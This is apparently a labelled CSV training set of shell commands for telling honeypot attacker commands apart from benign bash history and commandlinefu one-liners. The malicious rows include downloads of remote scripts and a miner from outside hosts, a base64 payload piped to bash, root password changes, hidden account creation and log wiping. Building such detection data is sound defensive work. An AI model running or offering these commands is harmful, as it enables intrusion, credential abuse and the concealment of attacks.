id,command,label,source,split
d2_002589,cat /dev/null > /var/log/spooler,1,honeypot,train
d2_002590,rm -r s,0,bash_history,train
d2_002591,git push /home/ec2-user/git/central_repo/,0,bash_history,train
d2_002595,cat -n primeiro |gerp > teste3,0,bash_history,train
d2_002596,cat /dev/null >/root/.bash_history,1,honeypot,train
d2_002597,"oc new-project abi-gogs --display-name ""Shared Gogs""",0,bash_history,train
d2_002598,"find -name ""*.txt"" | xargs grep ""math_util_test""| vim -",0,bash_history,train
d2_002599,git branch Service,0,bash_history,train
d2_002600,gcc 1.c,0,bash_history,train
d2_002602,kustomize edit add base ../../base,0,bash_history,train
d2_002603,curl -O -f http://hc0a8b005.example.net/.x15cache,1,honeypot,train
d2_002604,sudo easy_install tornado,0,bash_history,train
d2_002606,mdadm -?,0,bash_history,train
d2_002607,gcc writebasic.c,0,bash_history,train
d2_002609,vim $(git diff origin/master --name-only),0,commandlinefu,train
d2_002610,killall geany,0,bash_history,train
d2_002611,tftp -r backuper2.sh -g cybercoldbox.theworkpc.com:8088,1,honeypot,train
d2_002612,ls -ltr SAS,0,bash_history,train
d2_002613,[goalador@gatanda corpwebsite-starterkit]$ [goalador@gatanda Website_Theme]$ git clonestalkapp.com/corpwebsite-starterkit.git,0,bash_history,train
d2_002614,base64 --decode .push | bash,1,honeypot,train
d2_002615,cut -d: -f2 /etc/passwd,0,bash_history,train
d2_002616,file .dmrc,0,bash_history,train
d2_002617,bash -c ./VvwryJpc,1,honeypot,train
d2_002618,echo root:zVkYSMYO7BnR1yAz | chpasswd,1,honeypot,train
d2_002619,for a in *; do mv $a prefix${a}; done,0,commandlinefu,train
d2_002620,cat pro,0,bash_history,train
d2_002621,/etc/init.d/httpd restart,0,bash_history,train
d2_002622,mv ssh1.txt curl.txt,1,honeypot,train
d2_002624,sudo chsh -s /bin/zsh $USER,0,bash_history,train
d2_002625,LC_ALL=C $SHELL /tmp/r,1,honeypot,train
d2_002626,"diff <(ssh-keygen -y -f ~/.ssh/id_rsa) <(cut -d' ' -f1,2 ~/.ssh/id_rsa.pub)",0,commandlinefu,train
d2_002627,apt-get clean,0,bash_history,train
d2_002628,"top -p $(pgrep -d , foo)",0,commandlinefu,train
d2_002630,./1YZvoNeE,1,honeypot,train
d2_002631,do,1,honeypot,train
d2_002632,sudo nano client_sub.py,0,bash_history,train
d2_002634,grass5,0,bash_history,train
d2_002635,chmod +x lohn,0,bash_history,train
d2_002637,screenfetch,0,bash_history,train
d2_002639,chmod +x tftp2.sh,1,honeypot,train
d2_002640,vi result.html,0,bash_history,train
d2_002641,exiftool video.wmv,0,commandlinefu,train
d2_002642,"(echo -e '\xfe'; sleep 1) |telnet -L $HOSTIP 25565 2>/dev/null |awk -F'\xa7' '$2 {print ""users: ""$2""/""$3;}'",0,commandlinefu,train
d2_002643,"seq 1 3 20 | awk '{ T[NR]=$1} END {for (i=1;i<=(NR-1);i++) print T[i+1],""-"",T[i],""="" , T[i+1]-T[i]}'",0,commandlinefu,train
d2_002645,rm -rf *.log,1,honeypot,train
d2_002646,ps auwx | grep collectd,0,bash_history,train
d2_002648,ansible-playbook -i inventory/ref01 -l data001.ref01.conso.qualif.gen01.ke.p.fti.net beats.yml,0,bash_history,train
d2_002649,tcptraceroute www.google.com,0,commandlinefu,train
d2_002651,python1 v.py,1,honeypot,train
d2_002652,rm ptavio,0,bash_history,train
d2_002654,"sed '/^\s*[^@%]/s=\([A-Z][A-Z]*\)\([^}A-Z]\|},$\)={\1}\2=g' literature.bib > output.bib",0,commandlinefu,train
d2_002655,/bin/busybox chmod 777 .m aIRGuiCx09,1,honeypot,train
d2_002657,find . -type f | parallel -j+0 grep -i foobar,0,commandlinefu,train
d2_002658,gcc server.c csapp.c -o server -lpthrea,0,bash_history,train
d2_002660,awk 'length($0)!=12 {print}' your_file_name,0,commandlinefu,train
d2_002661,esptool.py --port /dev/ttyUSB0 -b 115000 -t run,0,bash_history,train
d2_002662,gitlab-ctl remove,0,bash_history,train
d2_002664,tftp -r Pemex2.sh -g 67.184.123.110,1,honeypot,train
d2_002665,sudo pacman -Ss Termite,0,bash_history,train
d2_002666,git add --all.,0,bash_history,train
d2_002667,for i in `lanscan -i | awk '{print $1}'` ; do ifconfig $i ; done 2> /dev/null,0,commandlinefu,train
d2_002669,sudo useradd -M -p 12Drz3wGBPzKs -s /bin/true x4_n1v,1,honeypot,train
d2_002670,"echo ""This text gets stamped on the top of the pdf pages."" | enscript -B -f Courier-Bold16 -o- | ps2pdf - | pdftk input.pdf stamp - output output.pdf",0,commandlinefu,train
d2_002671,wget https://hcbde1f0b.example.net/nXAR0/config.json,1,honeypot,train
d2_002672,docker start lucid_clarke,0,bash_history,train
d2_002673,"arecord -q -f cd -d 1 recvol.wav;sox recvol.wav -n stat 2>&1|grep RMS|grep amplitude|cut -d""."" -f2|cut -c 1-2>recvol;echo $((`cat recvol`+1))>recvol;rec -t wav - silence 1 0.1 `cat recvol` -1 1.0 `cat recvol`%|lame -s 44.1 -a -v - >record.mp3",0,commandlinefu,train
d2_002674,"zip -vr example.zip example/ -x ""*.DS_Store""",0,commandlinefu,train
d2_002675,ram=$(free -m | grep -oP '\d+' | head -n 1),1,honeypot,train
d2_002677,docker cp /tmp/arquivo hopeful_tesla:/tmp,0,bash_history,train
d2_002678,python3 control_gateway_and_process_with_mqtt.py,0,bash_history,train
d2_002679,bash -c ./KxyrnAJQ,1,honeypot,train
d2_002680,vi print_num.sh,0,bash_history,train
d2_002681,learn open README.md,0,bash_history,train
d2_002682,mpirun -np 2 gpaw-python dl-k-2nodes.py,0,bash_history,train
d2_002683,./vilker3_getcwd02 failas,0,bash_history,train
d2_002684,ls -ltrapR,0,commandlinefu,train
d2_002685,loh,0,bash_history,train
d2_002686,mkdir dir; cd $_,0,commandlinefu,train
d2_002687,./scripts/colorprompt.sh,0,bash_history,train
d2_002688,ll ../babymarvel/,0,bash_history,train
d2_002690,rm -rvf 微博紅人米妮大萌萌高清淫聲浪語電動玩騷逼\ 國產老婆黑絲長靴情趣套裝大雞雞直蹦達/,0,bash_history,train
d2_002691,gs -q -dNOPAUSE -dBATCH -sDEVICE=pdfwrite -sOutputFile=OUTPUT.pdf -c .setpdfwrite -f INPUT.pdf,0,commandlinefu,train
d2_002692,wget http://hae89ba54.example.net/SinBinbins.sh,1,honeypot,train
d2_002693,./5E2BtN8O,1,honeypot,train
d2_002694,PF=onyx STACK_NAME=boi-rec mdk ps curator,0,bash_history,train
d2_002697,echo <command>; !#:0-$,0,commandlinefu,train
d2_002701,ls mir-19/,0,bash_history,train
d2_002702,"sh -c 'S=askapache R=htaccess; find . -mount -type f|xargs -P5 -iFF grep -l -m1 ""$S"" FF|xargs -P5 -iFF sed -i -e ""s%${S}%${R}%g"" FF'",0,commandlinefu,train
d2_002703,ls recovery/,0,bash_history,train
d2_002704,git rm -q,0,bash_history,train
d2_002705,ll /var/jenkins_home/,0,bash_history,train
d2_002706,date --date=yesterday,0,commandlinefu,train
d2_002707,wget http://hf863cd6e.example.net/8UsA.sh,1,honeypot,train
d2_002709,wget nasapaul.com/Nasa.zip,1,honeypot,train
d2_002710,wget davidhacked.tk/xmrig,1,honeypot,train
d2_002712,dpkg -l | grep i3,0,bash_history,train
d2_002713,"( nw=192.168.0 ; h=1; while [ $h -lt 255 ] ; do ( ping -c2 -i 0.2 -W 0.5 -n $nw.$h & ); h=$[ $h + 1 ] ; done ) | awk '/^64 bytes.*/ { gsub( "":"","""" ); print $4 }' | sort -u",0,commandlinefu,train
d2_002714,svstat/*,0,bash_history,train
d2_002716,kill -9 `ps ax | egrep [f]elix.jar | egrep -o -e '^ *[0-9]+'`,0,commandlinefu,train
d2_002717,/bin/busybox echo -e '\x47\x72\x6f\x70/dev/shm' > /dev/shm/.nippon,1,honeypot,train
d2_002718,"svn status | awk '$1!~""M"" {print $0}'",0,commandlinefu,train
d2_002719,ps aux | sort -nk +4 | tail,0,commandlinefu,train
d2_002720,sudo vim /usr/local/rvm/gems/ruby-2.2.1/gems/active_admin_editor-1.1.0/app/assets/stylesheets/active_admin/editor.css.scss,0,bash_history,train
d2_002721,paste <(seq 7 | shuf | tr 1-7 A-G) <(seq 7 | shuf) | while read i j; do play -qn synth 1 pluck $i synth 1 pluck mix $2; done,0,commandlinefu,train
d2_002722,wget ftp://h535b3cc7.example.net/serv.tar.gz,1,honeypot,train
d2_002723,pgrep -a apt-get,0,bash_history,train
d2_002724,cat ~/workspace-eclipse/p4_pulsar/pulsar-marathon/lastgitcommit,0,bash_history,train
d2_002725,cp social-icon-font.ttf ~/.fonts/,0,bash_history,train
d2_002726,python manage.py runserver,0,bash_history,train
d2_002727,tftp 219.1.140.207 -c get Razor.sh,1,honeypot,train
d2_002729,sh awoo.sh,1,honeypot,train
d2_002730,chmod +x luoUKdvF,1,honeypot,train
d2_002731,https://hcbde1f0b.example.net/srKAe/bot.pl,1,honeypot,train
d2_002732,grep -v ^# /etc/somefile.conf | grep .,0,commandlinefu,train
d2_002733,"echo ""admin"" | sudo -S mount -o remount,rw '/'",1,honeypot,train
d2_002734,Hostname workstation-${GUID}.rhpds.opentlc.com,0,bash_history,train
d2_002736,h|grep -i iptables,0,bash_history,train
d2_002737,iftop -i eth0,0,bash_history,train
d2_002738,rm copy.*,0,bash_history,train
d2_002739,"seq 1 9 | perl -e 'print sort { (-1,1)[rand(2)] } <>'",0,commandlinefu,train
d2_002740,read -p 'Username: ' u;sudo -H -u $u xauth add $(xauth list|grep :$(echo ${DISPLAY: -4:2}));sudo su - $u,0,commandlinefu,train
d2_002741,syscfg set mgmt_wan_telnetaccess 1,0,bash_history,train
d2_002742,/bin/busybox echo -e '\x47\x72\x6f\x70/proc/scsi' > /proc/scsi/.nippon,1,honeypot,train
d2_002743,find . -type f -iname '*.mp3' -print0 | xargs -0 mp3gain -r -k,0,commandlinefu,train
d2_002745,wget http://haa86746f.example.net/itooamgay/typpaostur.sh,1,honeypot,train
d2_002747,chmod 777 sensi2.sh,1,honeypot,train
d2_002748,vi /etc/hosts,0,bash_history,train
d2_002749,rm .s,1,honeypot,train
d2_002751,cat /dev/urandom | pv -L 3m | dd bs=1M count=100 iflag=fullblock > /dev/null,0,commandlinefu,train
d2_002752,ftpget -v -u anonymous -p anonymous -P 21 204.113.152.244 kuma-ssh-update1.sh kuma-ssh-update1.sh,1,honeypot,train
d2_002753,./8digUfrE,1,honeypot,train
d2_002754,"curl -n --ssl-reqd --mail-from ""<user@gmail.com>"" --mail-rcpt ""<user@server.tld>"" --url smtps://smtp.gmail.com:465 -T file.txt",0,commandlinefu,train
d2_002755,cat>sysfile.c,0,bash_history,train
d2_002756,acpi -a,0,commandlinefu,train
d2_002757,chmod 777 Pemex2.sh,1,honeypot,train
d2_002758,grep ^Dirty /proc/meminfo,0,commandlinefu,train
d2_002760,mkdir certs crl newcerts private,0,bash_history,train
d2_002761,vim archives/ppgsigc/cfg/namedsets/eprint,0,bash_history,train
d2_002763,cp -a ~/Downloads/git.emacs.d/yspel ~/.emacs.d/,0,bash_history,train
d2_002764,apt-file find bin/programname,0,commandlinefu,train
d2_002765,"ps -eo etime,pid,pcpu,ppid,args | sed -e '/\[.\+\]/d' -e '/^[ \t]*[0-9]\{2\}:[0-9]\{2\} /d' | sort -k1r",0,commandlinefu,train
d2_002766,./bana,1,honeypot,train
d2_002768,ls STAR_2.3.0e/,0,bash_history,train
d2_002769,"for i in {1..6}; do printf ""%0.2X:"" $[ $RANDOM % 0x100 ]; done | sed 's/:$/\n/'",0,commandlinefu,train
d2_002770,"mv Sugar\,\ We\'re\ Goin\'\ Down\ Radio/* /media/bjohnston/Acer/Users/bjohnston/MusiC/",0,bash_history,train
d2_002771,vi Queue.c,0,bash_history,train
d2_002772,"ps auxw |egrep ""PID|process_to_look_at""",0,commandlinefu,train
d2_002773,"tail -f /var/log/logfile|perl -e 'while (<>) {$l++;if (time > $e) {$e=time;print ""$l\n"";$l=0}}'",0,commandlinefu,train
d2_002775,strings /usr/sbin/sshd | grep Accepted -A2,1,honeypot,train
d2_002776,git commit -a SSD1306/,0,bash_history,train
d2_002777,nano -c js/buttonHandler.js,0,bash_history,train
d2_002778,ssh ${MYUSER}@workstation-${GUID}.rhpds.opentlc.com,0,bash_history,train
d2_002779,sudo git remote add originspberry_pi_dibaggioj.git,0,bash_history,train
d2_002780,"exiftool ""-AllDates=1986:11:05 12:00:00"" a.jpg; exiftool ""-DateTimeOriginal>FileModifyDate"" a.jpg",0,commandlinefu,train
d2_002781,mv Batman\ vs.\ Superman\ 2016/ Batman\ vs.\ Superman,0,bash_history,train
d2_002782,imv foo,0,commandlinefu,train
d2_002783,./testall.sh &,0,bash_history,train
d2_002784,awk 'BEGIN {a=1;b=1;for(i=0;i<'${NUM}';i++){print a;c=a+b;a=b;b=c}}',0,commandlinefu,train
d2_002785,gs -sDEVICE=pngalpha -sOutputFile=<filename>%d.png -r<resolution> <pdffile>,0,commandlinefu,train
d2_002786,ps -efl,0,bash_history,train
d2_002789,cat -n <file> | sort -k 2 | uniq -f 1 | sort -n | cut -f 2-,0,commandlinefu,train
d2_002791,sudo get-apt install emacs,0,bash_history,train
d2_002792,sudo dnf install nodejs,0,bash_history,train
d2_002793,rm lsThu\ Jul\ 14\ 21\:10\:13\ EDT\ 2016.txt,0,bash_history,train
d2_002794,0xc0032332: frame_free (...uild/../../vm/frame.c:125),0,bash_history,train
d2_002795,./caps-to-root2,1,honeypot,train
d2_002796,/bin/busybox echo -e '\x47\x72\x6f\x70/sys/fs/cgroup/blkio' > /sys/fs/cgroup/blkio/.nippon,1,honeypot,train
d2_002797,la -a,0,bash_history,train
d2_002798,rosmsg show auv_msgs/Pose,0,bash_history,train
d2_002799,mdk ps grafana | more,0,bash_history,train
d2_002800,apt-get install openssh patch php-dev python readline-dev rlwrap rsync ruby-dev,0,bash_history,train
d2_002801,tr [a-z][A-Z] > arquivotrabalho,0,bash_history,train
d2_002802,vi progress.conf.bak,0,bash_history,train
d2_002803,cd -,0,commandlinefu,train
d2_002804,convert image1 image2 -resize '400x300!' MIFF:- | compare -metric AE -fuzz '10%' - null:,0,commandlinefu,train
d2_002805,ca nohup.out,0,bash_history,train
d2_002807,fuser -k 445/tcp,0,commandlinefu,train
d2_002808,ll|grep -i beauty,0,bash_history,train
d2_002809,find . -name CcspMocaAgentSsp,0,bash_history,train
d2_002810,cd home,1,honeypot,train
d2_002811,good http://hb967bfcb.example.net/g.txt -O sdf3fslsdf14,1,honeypot,train
d2_002812,wgetsecure/attachment/10800/summarize_for_ss.tar.gz,0,bash_history,train
d2_002814,ffmpeg -i 00_6_Example_Onepager.de_22-09.mkv -vcodec copy -acodec copy 00_6_Example_Onepager.de_22-09.mp4,0,bash_history,train
d2_002815,ssh bos-lvthz.kendall.corp.akamai.com,0,bash_history,train
d2_002816,/bin/busybox echo -e '\x50\x6f\x72\x74/proc/timer_list' > /proc/timer_list/.none,1,honeypot,train
d2_002818,python3 dadbot.py,0,bash_history,train
d2_002819,touch /var/log/wtmp,1,honeypot,train
d2_002822,wget http://h0c56f233.example.net/zatoempire.sh,1,honeypot,train
d2_002824,ls -f /var/tmp,0,bash_history,train
d2_002826,page.c,0,bash_history,train
d2_002827,"echo ""IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApta2RpciAuWDE3LXVuaXgKY2QgLlgxNy11bml4Cm12IC92YXIvdG1wL2RvdGEudGFyLmd6IGRvdGEudGFyLmd6CnRhciB4ZiBkb3RhLnRhci5negpzbGVlcCAzcyAmJiBjZCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYwpub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTkyLjE2OCA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bSAmJiBub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTcyLjE2ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDIwbSAmJiBjZCAuLjsgL3RtcC8uWDE3LXVuaXgvLnJzeW5jL2luaXRhbGwgMj4xJgpleGl0IDA="" | base64 --decode | bash",1,honeypot,train
d2_002829,cat db_backup.sh,0,bash_history,train
d2_002831,"for i in *; do echo ""<li><a href='$i'>$i</a>""; done > index.html",0,commandlinefu,train
d2_002833,yii socket/start-socket &,0,bash_history,train
d2_002835,mkdir data,0,bash_history,train
d2_002837,sudo docker-compose.yml,0,bash_history,train
d2_002838,lynx -head -dump http://h7746b8d5.example.net 'Bender|Fry'|sed 's/X-//',0,commandlinefu,train
d2_002839,seq 1 255 | parallel -j+0 'nc -w 1 -z -v 192.168.1.{} 80',0,commandlinefu,train
d2_002841,objdump -hrnt /bin/vi | more,0,bash_history,train
d2_002842,git push origin single_adapter_class,0,bash_history,train
d2_002843,at <date> < jobs.sh,0,commandlinefu,train
d2_002845,"useradd -m -p $(perl -e'print crypt(""passwordscelta"", ""stigghiola"")') user",0,commandlinefu,train
d2_002846,"/opt/kafka/bin/kafka-console-consumer.sh --new-consumer --topic alerts-api --bootstrap-server=p3-kafbrk01.extranet.akamai.com:6667 | jq -c 'select(.level==""INFO"")|{timeInMilliseconds,message}'",0,bash_history,train
d2_002847,neofetch --w3m ~/Pictures/tux.png,0,bash_history,train
d2_002848,redis-server /etc/redis/redis.conf,0,bash_history,train
d2_002849,>/mnt/.file,1,honeypot,train
d2_002850,sudo pacman sxiv,0,bash_history,train
d2_002852,sudo apt-get install pypthon-pip python-dev build-essential,0,bash_history,train
d2_002853,mkdir lin11,0,bash_history,train
d2_002855,./test_n,0,bash_history,train
d2_002856,grep HWI axo_right.fq axo_left.fq |wc -l,0,bash_history,train
d2_002857,nslookup ss6.examplse.com 76.132.177.92,0,bash_history,train
d2_002859,python life.py,0,bash_history,train
d2_002860,rm -rf njs.sh tftp1.sh tftp2.sh ftp1.sh,1,honeypot,train
d2_002861,sudo ethtool -s eth0 wol d,0,commandlinefu,train
d2_002862,passwd: Authentication token manipulation error,1,honeypot,train
d2_002863,pacman -Ql qt5-base,0,bash_history,train
d2_002864,./3s3Z3Ogf,1,honeypot,train
d2_002865,"echo ""root Vitoria_123"" > /tmp/up.txt",1,honeypot,train
d2_002867,bin/epadmin reload ppgsigc,0,bash_history,train
d2_002869,curl -O http://hdf8b9f14.example.net/awoo.sh,1,honeypot,train
d2_002870,grep -RPish '(?<=ppa.launchpad.net/)' /etc/apt | sort -u,0,bash_history,train
d2_002871,rr pathfile,0,bash_history,train
d2_002872,mplayer Fearless_First_lowered.mp3,0,bash_history,train
d2_002873,sudo yum install jenkins,0,bash_history,train
d2_002874,systemctl start jenkins,0,bash_history,train
d2_002875,"upto() { cd ""${PWD/\/$@\/*//$@}"" }",0,commandlinefu,train
d2_002876,vim /etc/resolv.bak,0,bash_history,train
d2_002877,sudo vi fstab,0,bash_history,train
d2_002879,pkill -f edoe,1,honeypot,train
d2_002880,ping isup.me,0,bash_history,train
d2_002881,ls -ltr ../../../trinity_test/,0,bash_history,train
d2_002882,mdk ps kibana,0,bash_history,train
d2_002883,tftp -r tftp1.sh -g 197.32.83.89,1,honeypot,train
d2_002884,yum install curl -y,1,honeypot,train
d2_002885,raspistill -o image2.jpg,0,bash_history,train
d2_002886,seq -s /etc/passwd,0,bash_history,train
d2_002887,"tar jcpf - [sourceDirs] |ssh user@host ""cat > /path/to/backup/backupfile.tar.bz2""",0,commandlinefu,train
d2_002888,mpirun -np 1 gpaw-python 22.py,0,bash_history,train
d2_002889,unzip flat_tab_widget.zip,0,bash_history,train
d2_002890,defaults write com.apple.Dock no-glass -boolean YES; killall Dock,0,commandlinefu,train
d2_002891,split -b 4700000000 file.img.gz file.img.gz.,0,commandlinefu,train
d2_002892,vi lampstack.pp,0,bash_history,train
d2_002893,rm STDOUT/axo_*.fq,0,bash_history,train
d2_002895,nano domain.pddl,0,bash_history,train
d2_002896,"tmux new-session -d -s ""SessionName"" ""htop""",0,commandlinefu,train
d2_002897,rm -f **/Thumbs.db,0,commandlinefu,train
d2_002898,sudo rmmod rtsx_pci_ms,0,bash_history,train
d2_002899,lnav -s,0,bash_history,train
d2_002900,./hbhWYIpE,1,honeypot,train
d2_002901,sudo mkdir cdrom,0,bash_history,train
d2_002902,diff spoiled new,0,bash_history,train
d2_002903,dlocate [ package | string ],0,commandlinefu,train
d2_002904,vim instackenv.json,0,bash_history,train
d2_002906,wget hkr.sunt.ws./ha.tgz,0,bash_history,train
d2_002907,ls -1 /lib/modules,0,commandlinefu,train
d2_002908,\[command],0,commandlinefu,train
d2_002909,rm -fr ~/.cpan/build/XML*,0,bash_history,train
d2_002910,nano dhru/urls.py,0,bash_history,train
d2_002912,./FkZkbZhd,1,honeypot,train
d2_002913,/var/lab/files/submit vilker3_pr2gynimas.c,0,bash_history,train
d2_002914,touch testvolume/toto,0,bash_history,train
d2_002916,/etc/init.d/mysql restart,0,bash_history,train
d2_002917,this is 2 fast to be trie,1,honeypot,train
d2_002919,"find . -type f -name ""*"" -mtime +10 -print -exec gzip {} \;",0,commandlinefu,train
d2_002920,sudo git credential-osxkeychain,0,bash_history,train
d2_002921,cat settings.py,0,bash_history,train
d2_002922,ps cat firefox,0,bash_history,train
d2_002923,sh Pemex1.sh,1,honeypot,train
d2_002925,git l,0,bash_history,train
d2_002926,apt-get installnload,1,honeypot,train
d2_002927,sudo scp -r hdfs hadoop/bin/,0,bash_history,train
d2_002928,cat juntatudo,0,bash_history,train
d2_002929,kitchen converge; kitchen verify,0,bash_history,train
d2_002930,"arp-scan -I eth0 -l | perl -ne '/((\d{1,3}\.){3}\d{1,3})/ and $ip=$1 and $_=`nmblookup -A $ip` and /([[:alnum:]-]+)\s+<00>[^<]+<ACTIVE>/m and printf ""%15s %s\n"",$ip,$1'",0,commandlinefu,train
